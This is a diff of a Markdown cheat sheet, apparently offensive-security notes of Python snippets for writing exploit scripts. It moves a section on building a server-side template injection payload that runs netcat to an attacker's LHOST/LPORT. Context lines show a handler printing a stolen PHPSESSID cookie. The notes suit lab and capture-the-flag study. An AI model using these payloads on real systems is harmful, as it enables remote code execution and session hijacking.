@@ -29,26 +29,26 @@ class log():
             print(f"{GREY}[{log._ts()}] [DEBUG] {GREY}{text}{NC}")
 # ...
 parser.add_argument('-d', '--debug', action='store_true', default=False, help='Enable debugging output')
+# ... 
+log.info(f"Target: {target}")
 ```
 ## Random Strings
 ```python
-# a-zA-Z
+LENGTH = 8 # How many characters do you want?
+
+# Letters only: a-zA-Z
 LETTERS = string.ascii_letters
-# a-zA-Z0-9
-LETTERS_NUM = string.ascii_letters + string.digits
-# a-zA-Z0-9!@#$...
-LETTERS_NUM_SYMBOLS = string.ascii_letters + string.digits + string.punctuation
-LENGTH = 8
-
-# Letters only
 random_letters = ''.join(random.choice(LETTERS) for _ in range(LENGTH))
-# Letters + numbers
-random_alnum = ''.join(random.choice(LETTERS_NUM) for _ in range(LENGTH))
-# Letters + numbers + symbols
-random_full = ''.join(random.choice(LETTERS_NUM_SYMBOLS) for _ in range(LENGTH))
-
 print("Letters:      ", random_letters)
+
+# Letters + numbers: a-zA-Z0-9
+LETTERS_NUM = string.ascii_letters + string.digits
+random_alnum = ''.join(random.choice(LETTERS_NUM) for _ in range(LENGTH))
 print("Alphanumeric: ", random_alnum)
+
+# Letters + numbers + symbols: a-zA-Z0-9!@#$...
+LETTERS_NUM_SYMBOLS = string.ascii_letters + string.digits + string.punctuation
+random_full = ''.join(random.choice(LETTERS_NUM_SYMBOLS) for _ in range(LENGTH))
 print("Full charset: ", random_full)
 ```
 ## Encoding and Decoding
@@ -72,6 +72,19 @@ print(url_decoded)
 ```
 > [!NOTE]
 > Use `utf-16` or `utf-16-le` for Windows/Powershell.
+
+
+## Using `.replace()`
+Too many curly braces (`{}`) will make you in trouble sometimes.
+```python
+ssti_payload = f"{{{{ __import__('os').system('nc {LHOST} {LPORT}') }}}}"
+```
+Use `replace()` instead,
+```python
+ssti_payload = "{{ __import__('os').system('nc <LHOST> <LPORT>') }}"\
+    .replace("<LHOST>", LHOST)\
+    .replace("<LPORT>", LPORT)
+```
 
 ## Sending Requests
 ### Session Setup
@@ -292,17 +305,6 @@ def doGET(self):
     plain_cookie = urlsafe_b64decode(enc_cookie).decode()
     session.cookies["PHPSESSID"] = cookies.SimpleCookie(plain_cookie)["PHPSESSID"]
     print("[+] Stolen cookie:", session.cookies["PHPSESSID"])
-```
-## Using `.replace()`
-Too many curly braces (`{}`) will make you in trouble sometimes.
-```python
-ssti_payload = f"{{{{ __import__('os').system('nc {LHOST} {LPORT}') }}}}"
-```
-Use `replace()` instead,
-```python
-ssti_payload = "{{ __import__('os').system('nc <LHOST> <LPORT>') }}"\
-    .replace("<LHOST>", LHOST)\
-    .replace("<LPORT>", LPORT)
 ```
 
 ## Other interesting links, blogs and snippets
